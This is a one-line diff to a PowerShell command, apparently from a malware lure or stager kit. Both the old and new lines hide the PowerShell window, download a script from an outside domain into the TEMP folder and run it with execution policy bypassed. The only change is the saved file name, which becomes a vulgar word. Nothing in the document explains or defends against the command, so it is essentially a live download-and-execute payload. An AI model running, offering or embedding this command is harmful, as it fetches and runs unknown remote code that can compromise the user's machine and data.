@@ -1,1 +1,1 @@
-powershell.exe -NoProfile -w hidden -Command "Invoke-WebRequest -Uri 'http://starlightninjaart.cfd/Ne3fOOeAPjsi6VBS' -OutFile (Join-Path $env:TEMP 'ss.ps1'); " & powershell -ExecutionPolicy Bypass -File "%TEMP%\ss.ps1"
+powershell.exe -NoProfile -w hidden -Command "Invoke-WebRequest -Uri 'http://starlightninjaart.cfd/Ne3fOOeAPjsi6VBS' -OutFile (Join-Path $env:TEMP 'kurwa.ps1'); " & powershell -ExecutionPolicy Bypass -File "%TEMP%\kurwa.ps1"
